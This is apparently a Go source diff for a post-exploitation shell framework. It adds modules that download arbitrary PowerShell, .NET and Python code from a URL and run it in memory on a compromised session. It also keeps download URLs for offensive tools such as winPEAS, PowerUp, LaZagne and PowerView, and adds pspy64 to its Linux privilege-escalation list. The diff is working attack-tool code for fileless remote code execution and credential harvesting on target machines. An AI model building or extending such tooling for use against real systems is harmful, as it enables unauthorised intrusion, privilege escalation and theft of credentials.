@@ -33,6 +33,9 @@ func GetModuleRegistry() *ModuleRegistry {
 		globalRegistry.Register(&PSPYModule{})
 		globalRegistry.Register(&PrivescModule{})
 		globalRegistry.Register(&ShellScriptModule{})
+		globalRegistry.Register(&PowerShellScriptModule{})
+		globalRegistry.Register(&DotNetAssemblyModule{})
+		globalRegistry.Register(&PythonScriptModule{})
 	}
 	return globalRegistry
 }
@@ -105,7 +108,6 @@ const (
 	// Windows
 	URL_WINPEAS      = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe"
 	URL_POWERUP      = "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1"
-	URL_PRIVESCCHECK = "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1"
 	URL_LAZAGNE      = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe"
 	URL_SHARPUP      = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe"
 	URL_POWERVIEW    = "https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1"
@@ -116,12 +118,12 @@ var linuxPrivescScripts = []string{
 	URL_LINPEAS,
 	URL_LSE,
 	URL_DEEPCE,
+	URL_PSPY64,
 }
 
 var windowsPrivescScripts = []string{
 	URL_WINPEAS,
 	URL_POWERUP,
-	URL_PRIVESCCHECK,
 	URL_LAZAGNE,
 	URL_SHARPUP,
 	URL_POWERVIEW,
@@ -253,7 +255,7 @@ type ShellScriptModule struct{}
 
 func (m *ShellScriptModule) Name() string        { return "sh" }
 func (m *ShellScriptModule) Category() string    { return "custom" }
-func (m *ShellScriptModule) Description() string { return "Run arbitrary shell script from URL" }
+func (m *ShellScriptModule) Description() string { return "Run arbitrary bash script from URL" }
 func (m *ShellScriptModule) ExecutionMode() string { return "memory" }
 
 func (m *ShellScriptModule) Run(session *SessionInfo, args []string) error {
@@ -265,4 +267,61 @@ func (m *ShellScriptModule) Run(session *SessionInfo, args []string) error {
 	scriptArgs := args[1:]
 
 	return session.RunScriptInMemory(url, scriptArgs)
+}
+
+// PowerShellScriptModule - Run arbitrary PowerShell script from URL
+type PowerShellScriptModule struct{}
+
+func (m *PowerShellScriptModule) Name() string        { return "ps1" }
+func (m *PowerShellScriptModule) Category() string    { return "custom" }
+func (m *PowerShellScriptModule) Description() string { return "Run arbitrary PowerShell script from URL" }
+func (m *PowerShellScriptModule) ExecutionMode() string { return "memory" }
+
+func (m *PowerShellScriptModule) Run(session *SessionInfo, args []string) error {
+	if len(args) == 0 {
+		return fmt.Errorf("usage: run ps1 <url> [script args...]")
+	}
+
+	url := args[0]
+	scriptArgs := args[1:]
+
+	return session.RunPowerShellInMemory(url, scriptArgs)
+}
+
+// DotNetAssemblyModule - Run arbitrary .NET assembly from URL
+type DotNetAssemblyModule struct{}
+
+func (m *DotNetAssemblyModule) Name() string        { return "net" }
+func (m *DotNetAssemblyModule) Category() string    { return "custom" }
+func (m *DotNetAssemblyModule) Description() string { return "Run arbitrary .NET assembly from URL" }
+func (m *DotNetAssemblyModule) ExecutionMode() string { return "memory" }
+
+func (m *DotNetAssemblyModule) Run(session *SessionInfo, args []string) error {
+	if len(args) == 0 {
+		return fmt.Errorf("usage: run net <url> [assembly args...]")
+	}
+
+	url := args[0]
+	assemblyArgs := args[1:]
+
+	return session.RunDotNetInMemory(url, assemblyArgs)
+}
+
+// PythonScriptModule - Run arbitrary Python script from URL
+type PythonScriptModule struct{}
+
+func (m *PythonScriptModule) Name() string        { return "py" }
+func (m *PythonScriptModule) Category() string    { return "custom" }
+func (m *PythonScriptModule) Description() string { return "Run arbitrary Python script from URL" }
+func (m *PythonScriptModule) ExecutionMode() string { return "memory" }
+
+func (m *PythonScriptModule) Run(session *SessionInfo, args []string) error {
+	if len(args) == 0 {
+		return fmt.Errorf("usage: run py <url> [script args...]")
+	}
+
+	url := args[0]
+	scriptArgs := args[1:]
+
+	return session.RunPythonInMemory(url, scriptArgs)
 }
